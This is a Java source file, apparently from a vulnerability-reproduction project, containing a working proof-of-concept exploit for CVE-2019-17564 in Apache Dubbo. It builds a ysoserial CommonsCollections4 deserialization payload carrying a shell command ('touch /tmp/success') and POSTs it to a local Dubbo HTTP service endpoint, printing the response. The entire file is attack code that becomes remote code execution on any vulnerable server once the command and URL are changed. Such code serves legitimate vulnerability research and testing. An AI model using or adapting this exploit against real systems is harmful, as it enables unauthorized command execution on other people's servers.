package dubbo.cve;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import com.pacemrc.vuldebug.common.utils.http.Response;
import org.apache.http.client.methods.HttpPost;
import ysoserial.payloads.ObjectPayload;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;


public class CVE_2019_17564 {

    private static byte[] serializeObject(Object obj) {
        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(obj);
            oos.flush();
            return bos.toByteArray();
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public static void main(String[] args) throws Exception {

        String url = "http://127.0.0.1/com.pacemrc.dubbo.impl.DemoServiceImpl";
        String gadget = "CommonsCollections4";
        String cmd = "touch /tmp/success";
        ObjectPayload<?> payload = (ObjectPayload) Class.forName("ysoserial.payloads." + gadget).newInstance();
        Object obj = payload.getObject(cmd);

        byte[] bytes = serializeObject(obj);

        HttpRequest httpRequest = new HttpRequest();
        HttpPost httpPost = new HttpPost(url);
        Response response = httpRequest.sendByteArrayPost(httpPost, bytes);
        System.out.println(response.getStatusCode());
        System.out.println(response.getResponseBody());

    }
}
